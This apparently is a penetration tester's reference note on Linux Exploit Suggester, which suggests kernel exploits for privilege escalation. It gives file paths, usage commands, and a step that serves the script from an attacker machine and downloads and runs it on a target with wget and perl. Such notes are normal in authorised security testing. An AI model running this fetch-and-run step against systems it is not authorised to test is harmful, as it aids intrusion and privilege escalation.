---
tags: [tool, privesc, linux, exploit]
tool: "les"
category: "Privesc"
installed: true
phase: [privesc]
---

# les - Linux Exploit Suggester

## Tool Overview
Purpose: Suggest kernel exploits based on OS version
Location: /usr/share/linux-exploit-suggester/Linux_Exploit_Suggester.pl
Alternative: ~/tools/privesc/linux/linux-exploit-suggester-2/linux-exploit-suggester-2.pl

## When to Use
- After basic enumeration
- To find kernel exploits for the target version
- When you need CVE references

## How to Use It

Basic Usage:
perl /usr/share/linux-exploit-suggester/Linux_Exploit_Suggester.pl

Check Specific Kernel:
perl /usr/share/linux-exploit-suggester/Linux_Exploit_Suggester.pl -k 5.4.0

LES2 (Alternative):
~/tools/privesc/linux/linux-exploit-suggester-2/linux-exploit-suggester-2.pl

Transfer LES2 to Target:
On Kali: cd ~/tools/privesc/linux/linux-exploit-suggester-2 && python3 -m http.server 8000
On target: wget http://YOUR_IP:8000/linux-exploit-suggester-2.pl && perl linux-exploit-suggester-2.pl

## Related Tools
linpeas, searchsploit
